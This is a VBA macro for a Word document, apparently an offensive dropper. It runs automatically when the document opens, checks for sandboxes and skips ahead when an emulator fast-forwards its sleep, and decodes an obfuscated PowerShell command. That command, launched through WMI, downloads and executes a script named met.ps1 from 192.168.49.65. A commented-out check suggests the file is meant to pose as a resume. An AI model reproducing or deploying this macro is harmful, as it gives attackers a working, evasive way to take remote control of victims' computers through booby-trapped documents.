Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function FlsAlloc Lib "kernel32" (ByVal lpCallback As LongPtr) As Long

Sub Document_Open()
  ShellcodeRunner
End Sub

Sub AutoOpen()
  ShellcodeRunner
End Sub

Function TQQQ(VGT)
    TQQQ = Chr(VGT - 9)
End Function

Function QQQ(SQQQ)
    QQQ = Left(SQQQ, 3)
End Function

Function Vanguard(MSFT)
    Vanguard = Right(MSFT, Len(MSFT) - 3)
End Function

Function BTC(APPL)
    Do
    TSLA = TSLA + TQQQ(QQQ(APPL))
    APPL = Vanguard(APPL)
    Loop While Len(APPL) > 0
    BTC = TSLA
End Function


Function ShellcodeRunner()
 
  
  ' resume.doc
  
  'If ActiveDocument.Name <> BTC("131118132134126118063117128116") Then
    'Exit Function
  'End If
  
  ' Check if we're in a sandbox by calling a rare-emulated API
  If IsNull(FlsAlloc(tmp)) Then
    Exit Function
  End If

  ' Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction
  dream = Int((1500 * Rnd) + 2000)
  before = Now()
  Sleep (dream)
  If DateDiff("s", t, Now()) < dream Then
    Exit Function
  End If

  Dim VOO As String
  Dim VTX As String

' "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.49.65/met.ps1'))"
  VOO = "121120128110123124113110117117041054110129110108041107130121106124124041054119120121041054128041113114109109110119041054108041114110129049049119110128054120107115110108125041124130124125110118055119110125055128110107108117114110119125050055109120128119117120106109124125123114119112049048113125125121067056056058066059055058063065055061066055063062056118110125055121124058048050050"
  VTX = BTC(VOO)
  GetObject(BTC("128114119118112118125124067")).Get(BTC("096114119060059104089123120108110124124")).Create VTX, ETH, SQ, QQQM
End Function

' GetObject("winmgmts:").Get("Win32_Process").Create VTX, ETH, SQ, QQQM

